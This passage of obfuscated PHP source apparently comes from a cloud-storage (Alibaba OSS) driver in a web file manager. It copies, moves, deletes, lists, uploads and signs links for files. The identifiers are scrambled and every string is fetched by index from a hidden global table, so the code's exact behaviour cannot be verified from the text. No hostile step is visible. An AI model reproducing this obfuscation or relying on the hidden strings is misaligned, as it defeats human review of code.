$¼Çãµ¬, $Ş¯ÓØÜÓ[1433] => $İàø³ƒ¦); $this->cacheMethodInfoSet($Ö›¼şáÇ, $Øƒ¹®À», $ÉÕŠš¬¡); if ($Øƒ¹®À») { $ı¥èÀÙ®[] = $Ö›¼şáÇ; continue; } $¦è„Ìıé[] = $ê½ùö; } foreach ($ØùøˆĞµ as $×µ¯äôä) { $ı¥èÀÙ®[] = $×µ¯äôä->getPrefix(); $this->cacheMethodInfoSet($×µ¯äôä->getPrefix(), !0); } if ($éËÍªÀ¦ === $Ş¯ÓØÜÓ[12]) { break; } } $this->cacheMethodInfoSet($˜Îİê‰ä, !0); return array($Ş¯ÓØÜÓ[84] => $ı¥èÀÙ®, $Ş¯ÓØÜÓ[85] => $¦è„Ìıé); } public function copyFile($Œò‚²åù, $øØÆÕ”½) { $–Ú¨“ö× = $this->size($Œò‚²åù); if ($–Ú¨“ö× < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $Œò‚²åù, $this->bucket, $this->pathEncode($øØÆÕ”½)); } catch (OSS\Core\OssException $Àú½ÆÙ) { return !1; } return $this->getPathOuter($øØÆÕ”½); } $Ö‰ëèÌì = $this->multiCopyObject($Œò‚²åù, $øØÆÕ”½, $–Ú¨“ö×); return $Ö‰ëèÌì ? $this->getPathOuter($øØÆÕ”½) : !1; } private function multiCopyObject($•–µ•Àõ, $×ÓãÑøÛ, $™Æ¯—Â¤) { $¶…Ü›ã¹ =& $_SERVER[ò«¥Ê‡å]; try { $Úêß üÓ = array(); if ($İí÷Œ = $this->hashMd5($•–µ•Àõ)) { $Úêß üÓ = array(OSS\OssClient::OSS_HEADERS => array($¶…Ü›ã¹[1436] => $İí÷Œ)); } $ËŞ­÷Ûø = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($×ÓãÑøÛ), $Úêß üÓ); $üÀÁ¼ = 1; $¡¾©„¼¾ = 0; $ÄŞõéŠğ = array(); $³êøœ™© = 1024 * 1024 * 10; $´ÊØóúû = $this->client->generateMultiuploadParts($™Æ¯—Â¤, $³êøœ™©); foreach ($´ÊØóúû as $…õÍ”§» => $ÆÂõ›ôÛ) { $¢Øı‘æ = $¡¾©„¼¾ + (int) $ÆÂõ›ôÛ[$¶…Ü›ã¹[1437]]; $éù™”•î = (int) $ÆÂõ›ôÛ[$¶…Ü›ã¹[383]] + $¢Øı‘æ - 1; $¤ØÂ‹« = array($¶…Ü›ã¹[1438] => $¢Øı‘æ, $¶…Ü›ã¹[1439] => $éù™”•î); $ÄŞõéŠğ[] = $this->client->uploadPartCopy($this->bucket, $•–µ•Àõ, $this->bucket, $this->pathEncode($×ÓãÑøÛ), $üÀÁ¼, $ËŞ­÷Ûø, $¤ØÂ‹«); $üÀÁ¼ = $üÀÁ¼ + 1; } $­’òŠ¤é = array(); foreach ($ÄŞõéŠğ as $…õÍ”§» => $âğ·Ì) { $­’òŠ¤é[] = array($¶…Ü›ã¹[1440] => $…õÍ”§» + 1, $¶…Ü›ã¹[1441] => $âğ·Ì); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($×ÓãÑøÛ), $ËŞ­÷Ûø, $­’òŠ¤é); } catch (OSS\Core\OssException $ô¥²óÀ¸) { return !1; } return !0; } public function moveFile($“‡Ôó¤, $Ò÷©˜Ò–) { if ($this->copyFile($“‡Ôó¤, $Ò÷©˜Ò–)) { $this->remove($“‡Ôó¤); return $this->getPathOuter($Ò÷©˜Ò–); } return !1; } public function delFile($äå¸õÓÂ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($äå¸õÓÂ)); } catch (OSS\Core\OssException $º²ÖÜ¢å) { return !1; } return !0; } public function delFolder($Á¡Ã²ÏÙ) { $Ÿ®ŸóË =& $_SERVER[ò«¥Ê‡å]; if (!$this->exist($Á¡Ã²ÏÙ)) { return !0; } $this->listItemCache = !1; $Ÿ”Ñ‹¡  = $this->fileList($Á¡Ã²ÏÙ); $this->listItemCache = !0; $¬Æ¬¢Ôı = trim($Á¡Ã²ÏÙ, $Ÿ®ŸóË[8]) . $Ÿ®ŸóË[8]; if (!empty($Á¡Ã²ÏÙ) && $Á¡Ã²ÏÙ !== $Ÿ®ŸóË[214] && !in_array($¬Æ¬¢Ôı, $Ÿ”Ñ‹¡ [$Ÿ®ŸóË[84]])) { $Ÿ”Ñ‹¡ [$Ÿ®ŸóË[84]][] = $¬Æ¬¢Ôı; } $ö¢’½Ö = $this->delByBatch($Ÿ”Ñ‹¡ [$Ÿ®ŸóË[85]]); if (!$ö¢’½Ö) { return !1; } $ö¢’½Ö = $this->delByBatch($Ÿ”Ñ‹¡ [$Ÿ®ŸóË[84]]); if (!$ö¢’½Ö) { return !1; } return $this->delFile($¬Æ¬¢Ôı); } private function delByBatch($áıºÉËÒ) { foreach (array_chunk($áıºÉËÒ, 1000) as $ôóë¥ú†) { try { $this->client->deleteObjects($this->bucket, $ôóë¥ú†); } catch (OSS\Core\OssException $…š†Šæ) { return !1; } } return !0; } public function rename($–çÁ•ù©, $ÈÇå°¿¡) { return $this->renameObject($–çÁ•ù©, $ÈÇå°¿¡); } private function fileInfo($ÀØ÷Í¹ğ, $í§Ã‡…“ = false, $©…¢œ•½ = array()) { $‹ûËáé† =& $_SERVER[ò«¥Ê‡å]; $ˆ‚‹Ã„« = array($‹ûËáé†[32] => $this->pathThis($ÀØ÷Í¹ğ), $‹ûËáé†[86] => $this->getPathOuter($ÀØ÷Í¹ğ), $‹ûËáé†[33] => $‹ûËáé†[216], $‹ûËáé†[78] => isset($©…¢œ•½[$‹ûËáé†[78]]) ? $©…¢œ•½[$‹ûËáé†[78]] : 0, $‹ûËáé†[177] => $this->ext($ÀØ÷Í¹ğ)); if ($í§Ã‡…“) { return $ˆ‚‹Ã„«; } $ˆ‚‹Ã„«[$‹ûËáé†[217]] = $ˆ‚‹Ã„«[$‹ûËáé†[87]] = 0; $ˆ‚‹Ã„«[$‹ûËáé†[218]] = $ˆ‚‹Ã„«[$‹ûËáé†[219]] = !0; if (empty($©…¢œ•½)) { $áĞ´½óô = $this->objectMeta($ÀØ÷Í¹ğ); if (!$áĞ´½óô) { return $ˆ‚‹Ã„«; } $©…¢œ•½ = array($‹ûËáé†[87] => strtotime($áĞ´½óô[$‹ûËáé†[1435]]), $‹ûËáé†[78] => $áĞ´½óô[$‹ûËáé†[1434]] + 0, $‹ûËáé†[1433] => $áĞ´½óô[$‹ûËáé†[1433]]); } if (isset($©…¢œ•½[$‹ûËáé†[1433]]) && $©…¢œ•½[$‹ûËáé†[1433]]) { $ˆ‚‹Ã„«[$‹ûËáé†[221]] = trim($©…¢œ•½[$‹ûËáé†[1433]], $‹ûËáé†[120]); } if (isset($©…¢œ•½[$‹ûËáé†[78]])) { $ˆ‚‹Ã„«[$‹ûËáé†[78]] = $©…¢œ•½[$‹ûËáé†[78]]; } if (isset($©…¢œ•½[$‹ûËáé†[87]])) { $ˆ‚‹Ã„«[$‹ûËáé†[87]] = $©…¢œ•½[$‹ûËáé†[87]]; } if (isset($©…¢œ•½[$‹ûËáé†[196]]) && !trim($ˆ‚‹Ã„«[$‹ûËáé†[87]])) { $ˆ‚‹Ã„«[$‹ûËáé†[87]] = $©…¢œ•½[$‹ûËáé†[196]]; } return $ˆ‚‹Ã„«; } private function folderInfo($ÓÉ¨áË, $ÂŸ’æ¿É = false, $¥¢µ©ş… = array()) { $Ñ‹ß’ñ§ =& $_SERVER[ò«¥Ê‡å]; $«ë’ú = array($Ñ‹ß’ñ§[32] => $this->pathThis($ÓÉ¨áË), $Ñ‹ß’ñ§[86] => $this->getPathOuter($Ñ‹ß’ñ§[8] . $ÓÉ¨áË), $Ñ‹ß’ñ§[33] => $Ñ‹ß’ñ§[77]); if ($ÂŸ’æ¿É) { return $«ë’ú; } $«ë’ú[$Ñ‹ß’ñ§[217]] = $«ë’ú[$Ñ‹ß’ñ§[87]] = 0; $«ë’ú[$Ñ‹ß’ñ§[218]] = $«ë’ú[$Ñ‹ß’ñ§[219]] = !0; if (empty($¥¢µ©ş…)) { $ÓÉ¨áË = rtrim($ÓÉ¨áË, $Ñ‹ß’ñ§[8]) . $Ñ‹ß’ñ§[8]; $Ç€œ¦ÊÅ = $this->objectMeta($ÓÉ¨áË); if (!$Ç€œ¦ÊÅ) { return $«ë’ú; } $¥¢µ©ş… = array($Ñ‹ß’ñ§[217] => $Ç€œ¦ÊÅ[$Ñ‹ß’ñ§[546]][$Ñ‹ß’ñ§[1442]], $Ñ‹ß’ñ§[87] => strtotime($Ç€œ¦ÊÅ[$Ñ‹ß’ñ§[1435]])); } if (isset($¥¢µ©ş…[$Ñ‹ß’ñ§[87]])) { $«ë’ú[$Ñ‹ß’ñ§[87]] = $¥¢µ©ş…[$Ñ‹ß’ñ§[87]]; } if (isset($¥¢µ©ş…[$Ñ‹ß’ñ§[217]])) { $«ë’ú[$Ñ‹ß’ñ§[217]] = $¥¢µ©ş…[$Ñ‹ß’ñ§[217]]; } return $«ë’ú; } public function listPath($÷¨’¬ó, $È…èŒÈ = false) { $ÅàˆÏèÛ =& $_SERVER[ò«¥Ê‡å]; $šïıûØÕ = $this->fileList($÷¨’¬ó, $ÅàˆÏèÛ[8], !0); foreach ($šïıûØÕ[$ÅàˆÏèÛ[84]] as $ÎÊ¡›î => $¯Ü½è) { $šïıûØÕ[$ÅàˆÏèÛ[84]][$ÎÊ¡›î] = $this->folderInfo($¯Ü½è, $È…èŒÈ, $¯Ü½è); } foreach ($šïıûØÕ[$ÅàˆÏèÛ[85]] as $ÎÊ¡›î => $¯Ü½è) { $šïıûØÕ[$ÅàˆÏèÛ[85]][$ÎÊ¡›î] = $this->fileInfo($¯Ü½è[$ÅàˆÏèÛ[32]], $È…èŒÈ, $¯Ü½è); } return $šïıûØÕ; } protected function infoChildren($¸˜òôËê, &$‘ö½Íõ·) { $ñ‘Ô”â´ =& $_SERVER[ò«¥Ê‡å]; $Ö½Æ¬ï‘ = $this->fileList($¸˜òôËê, $ñ‘Ô”â´[12], !0); $‘ö½Íõ·[$ñ‘Ô”â´[80]] += count($Ö½Æ¬ï‘[$ñ‘Ô”â´[84]]); $‘ö½Íõ·[$ñ‘Ô”â´[79]] += count($Ö½Æ¬ï‘[$ñ‘Ô”â´[85]]); foreach ($Ö½Æ¬ï‘[$ñ‘Ô”â´[85]] as $Ïü“œÊã) { if (!$Ïü“œÊã || !$Ïü“œÊã[$ñ‘Ô”â´[78]]) { continue; } $‘ö½Íõ·[$ñ‘Ô”â´[78]] += $Ïü“œÊã[$ñ‘Ô”â´[78]]; } } public function has($ˆáğâä, $öì²‰Ÿï = false, $×ƒàƒ‚ = true) { $à¡·Í¹­ =& $_SERVER[ò«¥Ê‡å]; $ˆáğâä = trim($ˆáğâä, $à¡·Í¹­[8]); $ÁöàË«¤ = empty($ˆáğâä) && $ˆáğâä !== $à¡·Í¹­[214] ? $à¡·Í¹­[12] : $ˆáğâä . $à¡·Í¹­[8]; $¬Å“‡Ñî = $à¡·Í¹­[12]; $ ÇÇ¼ÅÃ = 500; $«î˜Ïı = $ÏÄæ¢Æí = 0; while (!0) { check_abort(); $›£¹Èú = array($à¡·Í¹­[1429] => $à¡·Í¹­[8], $à¡·Í¹­[1430] => $ÁöàË«¤, $à¡·Í¹­[1431] => $ ÇÇ¼ÅÃ, $à¡·Í¹­[1432] => $¬Å“‡Ñî); try { $ˆ×È²å = $this->client->listObjects($this->bucket, $›£¹Èú); } catch (OSS\Core\OssException $©¸˜Õ) { break; } $¬Å“‡Ñî = $ˆ×È²å->getNextMarker(); $’ˆæñíÊ = $ˆ×È²å->getObjectList(); $¡ù©¥×£ = $ˆ×È²å->getPrefixList(); if ($öì²‰Ÿï) { if (count($’ˆæñíÊ) > 1 || count($’ˆæñíÊ) == 1 && $’ˆæñíÊ[0]->getKey() != $ÁöàË«¤) { $«î˜Ïı += count($’ˆæñíÊ) - 1; } if (!empty($¡ù©¥×£)) { $ÏÄæ¢Æí += count($¡ù©¥×£); } if ($¬Å“‡Ñî === $à¡·Í¹­[12]) { break; } continue; } if ($×ƒàƒ‚) { if (!empty($’ˆæñíÊ)) { if (count($’ˆæñíÊ) > 1 || $’ˆæñíÊ[0]->getKey() != $ÁöàË«¤) { return !0; } } } else { if (!empty($¡ù©¥×£)) { return !0; } } if ($¬Å“‡Ñî === $à¡·Í¹­[12]) { break; } } if ($öì²‰Ÿï) { return array($à¡·Í¹­[225] => $«î˜Ïı, $à¡·Í¹­[226] => $ÏÄæ¢Æí); } return !1; } public function listAll($‹ÏÀóİÃ) { $Ú‘ÜóÅ› =& $_SERVER[ò«¥Ê‡å]; $òü´šˆè = $this->fileList($‹ÏÀóİÃ, $Ú‘ÜóÅ›[12], !0); $ÇÌß‹ãÓ = array_to_keyvalue($òü´šˆè[$Ú‘ÜóÅ›[85]], $Ú‘ÜóÅ›[32]); foreach ($òü´šˆè[$Ú‘ÜóÅ›[84]] as $Íƒö³¡¶) { if (is_string($Íƒö³¡¶)) { $ÇÌß‹ãÓ[$Íƒö³¡¶] = array($Ú‘ÜóÅ›[78] => 0); } } return $this->listAllFiles($‹ÏÀóİÃ, $ÇÌß‹ãÓ); } public function canRead($ÀÒèõ¹ñ) { $¦¨Ã’æÒ =& $_SERVER[ò«¥Ê‡å]; $ø³Ùî = $this->pathAcl($ÀÒèõ¹ñ); return $ø³Ùî == $¦¨Ã’æÒ[1443] || $ø³Ùî == $¦¨Ã’æÒ[589] ? !0 : !1; } public function canWrite($ïÒ³Óş) { $ˆøô”Œ = $this->pathAcl($ïÒ³Óş); return $ˆøô”Œ == $_SERVER[ò«¥Ê‡å][589] ? !0 : !1; } public function pathAcl($‚‡Şƒá€) { $æ®ıĞ‹ç =& $_SERVER[ò«¥Ê‡å]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $®°àï±ù = $this->client->getObjectAcl($this->bucket, $this->pathEncode($‚‡Şƒá€)); } catch (OSS\Core\OssException $ÇºÁ’ËÅ) { return !1; } $äìğÍú = $®°àï±ù == $æ®ıĞ‹ç[37] ? $this->bucketAcl : $®°àï±ù; if ($äìğÍú == $æ®ıĞ‹ç[1444]) { return $æ®ıĞ‹ç[1443]; } if ($äìğÍú == $æ®ıĞ‹ç[1445]) { return $æ®ıĞ‹ç[589]; } return $äìğÍú; } private function chmodPath($ßºš¯½Ú, $Ê×¥©Â = '') { $Â®½Ş° =& $_SERVER[ò«¥Ê‡å]; $íğÜæãÆ = empty($Ê×¥©Â) ? $Â®½Ş°[1445] : $Ê×¥©Â; $„ñ¿ñ¥º = array($Â®½Ş°[37], $Â®½Ş°[215], $Â®½Ş°[1444], $Â®½Ş°[1445]); if (!in_array($íğÜæãÆ, $„ñ¿ñ¥º)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ßºš¯½Ú), $íğÜæãÆ); } catch (OSS\Core\OssException $•ƒş‰Ñõ) { return !1; } return !0; } public function getContent($Ó­å¥æ³) { return $this->fileSubstr($Ó­å¥æ³, -1); } public function setContent($ Í˜¥„, $ğëú£ú = '') { $¹™¸éñ² =& $_SERVER[ò«¥Ê‡å]; try { $Çë£å¶Ô = $this->trafficLimit($¹™¸éñ²[1446]); $õÜ§¶íé = $this->client->putObject($this->bucket, $this->pathEncode($ Í˜¥„), $ğëú£ú, $Çë£å¶Ô); } catch (OSS\Core\OssException $åªêé×ª) { return !1; } $ÃñŸ ß = array($¹™¸éñ²[1436] => trim($õÜ§¶íé[$¹™¸éñ²[1433]], $¹™¸éñ²[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ Í˜¥„))); $this->updateObjMeta($ Í˜¥„, $ÃñŸ ß); return isset($õÜ§¶íé[$¹™¸éñ²[1447]][$¹™¸éñ²[277]]) ? !0 : !1; } private function updateObjMeta($©ËÄÇåñ, $²“ùåñœ) { $©ËÄÇåñ = $this->pathEncode($©ËÄÇåñ); try { $™ßÔ÷ğà = array(OSS\OssClient::OSS_HEADERS => $²“ùåñœ); $this->client->copyObject($this->bucket, $©ËÄÇåñ, $this->bucket, $©ËÄÇåñ, $™ßÔ÷ğà); } catch (OSS\Core\OssException $Û¿‹ú‚Î) { return !1; } return !0; } public function upload($ÓÓÈü©”, $Šã±·Ë§, $¯ë“£ù = false, $»Çì‡“ = REPEAT_REPLACE) { $üÊïöõù =& $_SERVER[ò«¥Ê‡å]; $È„ÁÆ¹ = trim($ÓÓÈü©”, $üÊïöõù[8]); $œ”ªôÃß = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($üÊïöõù[1436] => @md5_file($Šã±·Ë§)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÓÓÈü©”))); $œ”ªôÃß = $this->trafficLimit($üÊïöõù[1446], $œ”ªôÃß); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($È„ÁÆ¹), $Šã±·Ë§, $œ”ªôÃß); } catch (OSS\Core\OssException $ûØ„ì¢ç) { return !1; } return $this->getPathOuter($ÓÓÈü©”); } public function getHost() { $Ã«ùÃÜÂ =& $_SERVER[ò«¥Ê‡å]; $’ùä¡éŒ = explode($Ã«ùÃÜÂ[200], parent::getHost()); return $’ùä¡éŒ[0] . $Ã«ùÃÜÂ[200] . $this->bucket . $Ã«ùÃÜÂ[10] . $’ùä¡éŒ[1]; } public function uploadFormData($¦Ï“»òŒ, $Íñ–¤à = 3600) { $ÆßÙÌ‚¥ =& $_SERVER[ò«¥Ê‡å]; if (!($§ĞïïŒœ = $this->getHost())) { return !1; } $¿ˆÊæÃŠ = $Íñ–¤à; $€ê¼µ¼Ğ = date($ÆßÙÌ‚¥[1448], time() + $¿ˆÊæÃŠ); $„²¾ğì = new DateTime($€ê¼µ¼Ğ); $ÁıÆãáŠ = $„²¾ğì->format(DateTime::ISO8601); $Õ»Œãí† = strpos($ÁıÆãáŠ, $ÆßÙÌ‚¥[342]); $ÁıÆãáŠ = substr($ÁıÆãáŠ, 0, $Õ»Œãí†) . $ÆßÙÌ‚¥[1449]; $¥ã­ê„ = 1048576000 * 5; $¹Ãêìßü = $this->pathFather($¦Ï“»òŒ); $‚‘³ÛƒÒ = array($ÆßÙÌ‚¥[260] => $ÁıÆãáŠ, $ÆßÙÌ‚¥[263] => array(array($ÆßÙÌ‚¥[1450], 0, $¥ã­ê„), array($ÆßÙÌ‚¥[266], $ÆßÙÌ‚¥[267], $¹Ãêìßü))); $ÉÄ¨üñŒ = base64_encode(json_encode($‚‘³ÛƒÒ)); $šı–ÔÈæ = base64_encode(hash_hmac($ÆßÙÌ‚¥[249], $ÉÄ¨üñŒ, $this->secret, !0)); $–Ìåó‡˜ = array($ÆßÙÌ‚¥[278] => $ÉÄ¨üñŒ, $ÆßÙÌ‚¥[1451] => $this->accessKey, $ÆßÙÌ‚¥[270] => $ÆßÙÌ‚¥[259], $ÆßÙÌ‚¥[1452] => $šı–ÔÈæ, $ÆßÙÌ‚¥[198] => $§ĞïïŒœ); $–Ìåó‡˜ = $this->trafficLimit($ÆßÙÌ‚¥[1446], $–Ìåó‡˜); return $–Ìåó‡˜; } public function multiUploadFormData($¹âµöÔó, $û°ë³åü = 3600) { $òşÂà”œ =& $_SERVER[ò«¥Ê‡å]; if (!($£Ô·„§” = $this->getHost())) { return !1; } $¯¡µƒ™Â = $this->trafficLimit($òşÂà”œ[1446]); $Ú›²Œğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($¹âµöÔó), $¯¡µƒ™Â); return array($òşÂà”œ[240] => $Ú›²Œğ, $òşÂà”œ[198] => $£Ô·„§” . $òşÂà”œ[8] . $this->pathEncode($¹âµöÔó), $òşÂà”œ[241] => gmdate($òşÂà”œ[1453]), $òşÂà”œ[96] => $¹âµöÔó); } public function multiUploadAuthData($¡ÁŞ—Ä, $ÏÊÎİ¹¹ = array()) { $À™÷ãÊ¤ =& $_SERVER[ò«¥Ê‡å]; $œ¯¨ëÕŒ = isset($ÏÊÎİ¹¹[$À™÷ãÊ¤[241]]) ? $ÏÊÎİ¹¹[$À™÷ãÊ¤[241]] : gmdate($À™÷ãÊ¤[1453]); $õæÇ°ıõ = isset($ÏÊÎİ¹¹[$À™÷ãÊ¤[177]]) ? $ÏÊÎİ¹¹[$À™÷ãÊ¤[177]] : $À™÷ãÊ¤[12]; $”“®…ñ‡ = $¡ÁŞ—Ä; if (isset($ÏÊÎİ¹¹[$À™÷ãÊ¤[96]])) { $”“®…ñ‡ = $ÏÊÎİ¹¹[$À™÷ãÊ¤[96]]; unset($ÏÊÎİ¹¹[$À™÷ãÊ¤[96]]); } if (isset($ÏÊÎİ¹¹[$À™÷ãÊ¤[242]])) { $ÏÊÎİ¹¹[$À™÷ãÊ¤[241]] = $œ¯¨ëÕŒ; return $this->listUploadParts($”“®…ñ‡, $ÏÊÎİ¹¹); } $™¼şáÌ² = array($À™÷ãÊ¤[243], $À™÷ãÊ¤[12], $À™÷ãÊ¤[122], $œ¯¨ëÕŒ, "\x78\x2d\157\163\x73\55\144\141\x74\145\x3a{$œ¯¨ëÕŒ}", $À™÷ãÊ¤[8] . $this->bucket . $À™÷ãÊ¤[8] . $”“®…ñ‡ . $õæÇ°ıõ); if (strpos($õæÇ°ıõ, $À™÷ãÊ¤[244]) === 0) { $™¼şáÌ²[0] = $À™÷ãÊ¤[245]; if ($ğë„ÁÆö = $this->trafficLimit($À™÷ãÊ¤[1446])) { $”“®…ñ‡ = $À™÷ãÊ¤[1454]; array_splice($™¼şáÌ², 5, 0, $”“®…ñ‡ . $À™÷ãÊ¤[4] . $ğë„ÁÆö[$”“®…ñ‡]); } } if (isset($ÏÊÎİ¹¹[$À™÷ãÊ¤[246]]) && $ÏÊÎİ¹¹[$À™÷ãÊ¤[246]] == $À™÷ãÊ¤[247]) { $™¼şáÌ²[0] = $À™÷ãÊ¤[247]; } if (!empty($ÏÊÎİ¹¹[$À™÷ãÊ¤[1455]])) { $úš‘ˆ…ô = array_merge(array($™¼şáÌ²[4]), $ÏÊÎİ¹¹[$À™÷ãÊ¤[1455]]); sort($úš‘ˆ…ô); $™¼şáÌ²[4] = implode($À™÷ãÊ¤[248], $úš‘ˆ…ô); } $ƒàè¸„í = implode($À™÷ãÊ¤[248], $™¼şáÌ²); $¥õƒüŒ = base64_encode(hash_hmac($À™÷ãÊ¤[249], $ƒàè¸„í, $this->secret, !0)); $³‹¬Ô½€ = $À™÷ãÊ¤[1419] . $this->accessKey . $À™÷ãÊ¤[4] . $¥õƒüŒ; if (strpos($õæÇ°ıõ, $À™÷ãÊ¤[244]) === 0) { $³‹¬Ô½€ = array($À™÷ãÊ¤[251] => $³‹¬Ô½€, $À™÷ãÊ¤[241] => $œ¯¨ëÕŒ); if ($ğë„ÁÆö) { $³‹¬Ô½€ = array_merge($³‹¬Ô½€, $ğë„ÁÆö); } } return $³‹¬Ô½€; } public function listUploadParts($ª÷—”¦Š, $­íš£ñ¶) { $Ã±œ–â =& $_SERVER[ò«¥Ê‡å]; $××Í¼üÔ = parse_url_query($­íš£ñ¶[$Ã±œ–â[177]]); $Ë¥ÌçïÂ = $this->client->listParts($this->bucket, $this->pathEncode($ª÷—”¦Š), $××Í¼üÔ[$Ã±œ–â[240]]); $ÂÀ¶´¯¿ = $Ë¥ÌçïÂ->getListPart(); $¦ª“ûó€ = array(); foreach ($ÂÀ¶´¯¿ as $×…„¨®´) { $¦ª“ûó€[] = array($Ã±œ–â[1440] => $×…„¨®´->getPartNumber(), $Ã±œ–â[1441] => trim($×…„¨®´->getETag(), $Ã±œ–â[120])); } unset($­íš£ñ¶[$Ã±œ–â[242]], $­íš£ñ¶[$Ã±œ–â[246]]); $¼ŸõÓıÃ = $this->multiUploadAuthData($ª÷—”¦Š, $­íš£ñ¶); if (empty($¼ŸõÓıÃ)) { return !1; } return array($Ã±œ–â[251] => $¼ŸõÓıÃ, $Ã±œ–â[241] => $­íš£ñ¶[$Ã±œ–â[241]], $Ã±œ–â[253] => $¦ª“ûó€); } public function download($“—ÙÉÈÜ, $¦°ÍÏ©£) { if ($this->isFolder($“—ÙÉÈÜ)) { return !1; } try { $ã÷À»£ı = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¦°ÍÏ©£); $ã÷À»£ı = $this->trafficLimit($_SERVER[ò«¥Ê‡å][111], $ã÷À»£ı); $this->client->getObject($this->bucket, $this->pathEncode($“—ÙÉÈÜ), $ã÷À»£ı); } catch (OSS\Core\OssException $Ïöíß‹ä) { return !1; } return $¦°ÍÏ©£; } public function fileSubstr($Û¯ëÒïœ, $º£›ğ­ = 0, $É¤üö¯° = false) { if ($º£›ğ­ === -1) { $ˆ—éÉŞ° = array(); } else { if ($É¤üö¯° === !1) { $š¤õĞÔÌ = $this->size($Û¯ëÒïœ); } else { $š¤õĞÔÌ = $º£›ğ­ + $É¤üö¯° - 1; } $ˆ—éÉŞ° = array(OSS\OssClient::OSS_RANGE => "{$º£›ğ­}\55{$š¤õĞÔÌ}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($Û¯ëÒïœ), $ˆ—éÉŞ°); } catch (OSS\Core\OssException $ÈÍÉåê½) { think_exception($ÈÍÉåê½->getMessage()); return !1; } } private function trafficLimit($‰û ¼Ó¢, $”¬ä‹ = array()) { $âõ‡¬‰ı =& $_SERVER[ò«¥Ê‡å]; if ($‰û ¼Ó¢ == $âõ‡¬‰ı[1446] && $this->isUploadServer() || $‰û ¼Ó¢ == $âõ‡¬‰ı[111] && $this->isFileOutServer()) { return $”¬ä‹; } $ÔœêŸºµ = floatval($GLOBALS[$âõ‡¬‰ı[6]][$âõ‡¬‰ı[91]][$âõ‡¬‰ı[109]][$‰û ¼Ó¢]) * 1024 * 1024 * 8; if (!$ÔœêŸºµ) { return $”¬ä‹; } $ÔœêŸºµ = $ÔœêŸºµ < 819200 ? 819200 : ($ÔœêŸºµ > 838860800 ? 838860800 : $ÔœêŸºµ); $”¬ä‹[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ÔœêŸºµ); return $”¬ä‹; } public function link($É¸æêˆ, $‘©Î©Í = array()) { $üòÌÔÌÇ =& $_SERVER[ò«¥Ê‡å]; if (!$this->exist($É¸æêˆ) || $this->isFolder($É¸æêˆ)) { return !1; } try { $‘©Î©Í = $this->trafficLimit($üòÌÔÌÇ[111], $‘©Î©Í); $ÛÓê±±ù = $this->client->signUrl($this->bucket, $this->pathEncode($É¸æêˆ), 3600 * 12, $üòÌÔÌÇ[247], $‘©Î©Í); return $this->getCdnLink($ÛÓê±±ù); } catch (OSS\Core\OssException $Û¿¯§­Ğ) { return !1; } } public function fileOut($„œœÂ¼, $ÂŠ­ıÔÅ = false, $åçœ« = false, $–¨Ãëñç = '') { $İ¼ğÚæÀ =& $_SERVER[ò«¥Ê‡å]; if ($this->isFileOutServer()) { return $this->fileOutServer($„œœÂ¼, $ÂŠ­ıÔÅ, $åçœ«, $–¨Ãëñç); } if (!$åçœ«) { $åçœ« = $this->pathThis($„œœÂ¼); } $åçœ« = rawurlencode($åçœ«); $´‡çË¡— = get_file_mime(get_path_ext($åçœ«)); if ($´‡çË¡— == $İ¼ğÚæÀ[234]) { return parent::fileOut($„œœÂ¼, $ÂŠ­ıÔÅ, $åçœ«, $–¨Ãëñç); } $ÂŠ­ıÔÅ = $ÂŠ­ıÔÅ ? $İ¼ğÚæÀ[1456] : $İ¼ğÚæÀ[1457]; $ºÚÓÖàÓ = array(OSS\OssClient::OSS_SUB_RESOURCE => $İ¼ğÚæÀ[1458] . rawurlencode("{$ÂŠ­ıÔÅ}\73\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3d{$åçœ«}")); $ºÚÓÖàÓ[OSS\OssClient::OSS_SUB_RESOURCE] .= $İ¼ğÚæÀ[1459] . rawurlencode($´‡çË¡—); $û“±Òœ = $this->link($„œœÂ¼, $ºÚÓÖàÓ); $this->fileOutLink($û“±Òœ); } public function fileOutServer($É‰åïì¹, $óÀÎ‰İ = false, $É¦º™¸ = false, $«Üî¨š¾ = '') { parent::fileOut($É‰åïì¹, $óÀÎ‰İ, $É¦º™¸, $«Üî¨š¾); } public function fileOutImage($õ©ì«Î¤, $Åàüù‘ = 250) { if ($this->size($õ©ì«Î¤) > 1024 * 1024 * 20) { return $this->fileOutImageServer($õ©ì«Î¤, $Åàüù‘); } $Ê®¦†ò› = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ò«¥Ê‡å][1416] . $Åàüù‘); $ÏÇ¾ƒ = $this->link($õ©ì«Î¤, $Ê®¦†ò›); $this->fileOutLink($ÏÇ¾ƒ); } public function fileOutImageServer($Ş†ı…“, $ßÂ€ˆĞ = 250) { parent::fileOutImage($Ş†ı…“, $ßÂ€ˆĞ); } public function fileOutLink($”¢º®¾¹) { $ò–ãÄã =& $_SERVER[ò«¥Ê‡å]; if (!$this->isCdnHost() && substr($”¢º®¾¹, 0, 7) == $ò–ãÄã[1378]) { $”¢º®¾¹ = $ò–ãÄã[1379] . substr($”¢º®¾¹, 7); } header($ò–ãÄã[164] . $”¢º®¾¹); die; } public function hashMd5($•ø°ìª­, $Ò‚î´µ® = '') { $îÆ”Ô =& $_SERVER[ò«¥Ê‡å]; $¬™¿¤ñ = $this->_objectMeta($•ø°ìª­); if (!$¬™¿¤ñ) { return $îÆ”Ô[12]; } if (!isset($¬™¿¤ñ[$îÆ”Ô[1436]]) && !empty($Ò‚î´µ®)) { $Ö¾ˆ‡æ¡ = $this->updateObjMeta($•ø°ìª­, array($îÆ”Ô[1436] => $Ò‚î´µ®)); $¬™¿¤ñ[$îÆ”Ô[1436]] = 